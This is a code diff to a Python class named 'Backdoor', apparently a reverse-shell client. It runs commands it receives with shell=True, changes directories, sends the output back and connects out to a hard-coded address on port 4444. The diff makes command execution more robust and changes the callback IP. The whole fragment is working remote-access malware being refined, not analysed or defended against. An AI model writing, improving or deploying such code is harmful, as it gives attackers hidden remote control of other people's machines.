@@ -20,7 +20,10 @@ class Backdoor:
             except ValueError:
                 continue
     def execute_command(self,command):
-        return subprocess.check_output(command,shell=True)
+        try:
+            return subprocess.check_output(command,shell=True)
+        except subprocess.CalledProcessError:
+            return "Error during command execution"
     def change_directory(self,path):
         os.chdir(path)
         return"[+} Changing working directory to "+ path
@@ -50,5 +53,5 @@ class Backdoor:
                 command_result="[-] Error during command execution."
         self.reliable_send(command_result)
         connection.close()
-backdoor=Backdoor("192.168.101.128",4444)
+backdoor=Backdoor("192.168.81.128",4444)
 backdoor.run()
